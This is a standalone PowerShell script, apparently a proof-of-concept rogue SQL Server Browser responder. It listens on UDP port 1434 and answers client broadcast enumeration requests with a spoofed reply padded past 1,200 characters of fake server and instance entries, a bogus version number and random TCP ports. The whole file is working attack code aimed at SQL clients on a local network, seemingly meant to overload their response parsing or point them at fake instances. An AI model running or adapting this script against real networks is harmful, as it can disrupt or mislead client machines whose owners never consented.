param( $address="Any", $port=1434)

if ($udpclient)
{
    $udpclient.Close()
}

try{
	$endpoint = new-object System.Net.IPEndPoint( [IPAddress]::$address, $port )
	$udpclient = new-object System.Net.Sockets.UdpClient $port
}
catch{
	throw $_
	exit -1
}

while( $true )
{
    Start-Sleep -Milliseconds 100 
	if( $udpclient.Available )
	{
		$content = $udpclient.Receive( [ref]$endpoint )
        if ($content[0] -eq 2) # let's reply only to CLNT_BCAST_EX
        {
            $resp = ""
            while ($resp.Length -le 1200)
            {
                $resp += "ServerName;{0};InstanceName;{1};IsClustered;No;Version;12.666.0.0;tcp;{2};;" -f (([System.IO.Path]::GetRandomFileName()).Substring(0,4)),(([System.IO.Path]::GetRandomFileName()).Substring(0,4)),(Get-Random -Minimum 10000 -Maximum 65000)
            }
            [byte[]]$dgram = 5 # SVR_RESP
            $dgram +=  [System.BitConverter]::GetBytes($resp.Length)[0,1] # data length
            $dgram += ([System.Text.Encoding]::ASCII).GetBytes($resp)
            $udpclient.Send($dgram, $dgram.Length, $endpoint)
        }
    }
}
